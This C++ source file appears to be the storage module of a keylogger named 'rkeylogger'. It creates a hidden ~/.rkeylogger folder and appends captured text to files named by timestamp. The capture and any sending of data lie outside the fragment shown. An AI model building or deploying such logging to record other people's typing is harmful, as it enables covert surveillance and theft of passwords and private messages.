#include <iostream>
#include <fstream>
#include <filesystem>
#include "utils.h" 
#include "save_input.h"

std::string rkeylogger_path = "/.rkeylogger";
std::ofstream file("");
bool is_started = false;

namespace fs = std::filesystem;

void close_lastfile(){
    if(file.is_open()){
        file.close();
    }
}

bool create_rkeylogger_folder(){
   const char* home_path = std::getenv("HOME");
    if (!home_path)
        return false;
    rkeylogger_path = home_path + rkeylogger_path;

    if(!fs::exists(rkeylogger_path)){
        std::cout << "[ LOG ]: Use the following folder for saving data: " << rkeylogger_path << "\n";
        return fs::create_directory(rkeylogger_path);
    }

    std::cout << "[ LOG ]: Use the following folder for saving data: " << rkeylogger_path << "\n";
    return true;
}

bool save_input(const char *text){
    if(!file.is_open()){
        file.open(rkeylogger_path + "/" + get_current_datetime());
        
        if(!file.is_open()){
            return false;
        }
    }
    
    file << text << "\n";
    return true;
}